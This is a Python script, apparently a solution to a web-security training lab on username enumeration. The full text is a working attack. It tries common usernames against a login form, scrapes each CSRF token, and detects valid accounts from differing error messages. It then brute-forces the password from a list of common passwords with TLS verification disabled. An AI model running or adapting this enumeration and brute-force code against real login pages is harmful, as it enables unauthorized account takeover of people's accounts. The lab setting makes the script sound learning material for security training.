#
#   Lab: Username enumeration via different responses
#
import socket
import os
import urllib
import re
import requests
import struct
from requests.packages.urllib3.exceptions import InsecureRequestWarning


usernames = ["user", "root", "admin", "test", "guest", "info", "adm", "mysql", "user", "administrator", "oracle", "ftp", "pi", "puppet", "ansible", "ec2-user", "vagrant", "azureuser", "academico", "acceso", "access", "accounting", "accounts", "acid", "activestat", "ad", "adam", "adkit", "admin", "administracion", "administrador", "administrator", "administrators", "admins", "ads", "adserver", "adsl", "ae", "af", "affiliate", "affiliates", "afiliados", "ag", "agenda", "agent", "ai", "aix", "ajax", "ak", "akamai", "al", "alabama", "alaska", "albuquerque", "alerts", "alpha", "alterwind", "am", "amarillo", "americas", "an", "anaheim", "analyzer", "announce", "announcements", "antivirus", "ao", "ap", "apache", "apollo", "app", "app01", "app1", "apple", "application", "applications", "apps", "appserver", "aq", "ar", "archie", "arcsight", "argentina", "arizona", "arkansas", "arlington", "as", "as400", "asia", "asterix", "at", "athena", "atlanta", "atlas", "att", "au", "auction", "austin", "auth", "auto", "autodiscover "]
passwords = ["123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow", "moscow "]

login_headers = {
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
}

print("\nStarting Scan")

login_page = ""

def passwordBrute(username):
    validUser = username
    for password in passwords:
        s = requests.Session()
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        g = s.get(login_page, headers=login_headers)

        csrfT = g.text
        for item in csrfT.split("\n"):
            if "value" in item:
                csrfString = item.strip()


        tmp = re.sub('\<input\ required\ type\=\"hidden\"\ name\=\"csrf\"\ value\=\"', '', csrfString)
        csrfToken = re.sub('\"\>', '', tmp)
        
        post_params = {
            "csrf":csrfToken,
            "username":validUser,
            "password":password
        }

        r = s.post(login_page, headers=login_headers, data=post_params, verify=False)
        if r.url == "https://ac701f4f1efaa81f80dd2bec003500b0.web-security-academy.net":
            print("\nLogged in with ----> " + username + " : " + password)
            os._exit(1)


for username in usernames:
    s = requests.Session()
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    g = s.get(login_page, headers=login_headers)
    csrfT = g.text
    for item in csrfT.split("\n"):
        if "value" in item:
            csrfString = item.strip()


    tmp = re.sub('\<input\ required\ type\=\"hidden\"\ name\=\"csrf\"\ value\=\"', '', csrfString)
    csrfToken = re.sub('\"\>', '', tmp)


    post_params = {
    "csrf":csrfToken,
    "username":username,
    "password":"password"
    }

    r = s.post(login_page, headers=login_headers, data=post_params, verify=False)
    validUser = r.text
    for item in validUser.split("\n"):
        if "<p class=is-warning>Invalid username</p>" in item:
            InvalidUser = item.strip()
        elif "<p class=is-warning>Incorrect password</p>" in item:
            print("\n"+username + " is valid. Starting password bruteforcing.")
            passwordBrute(username)

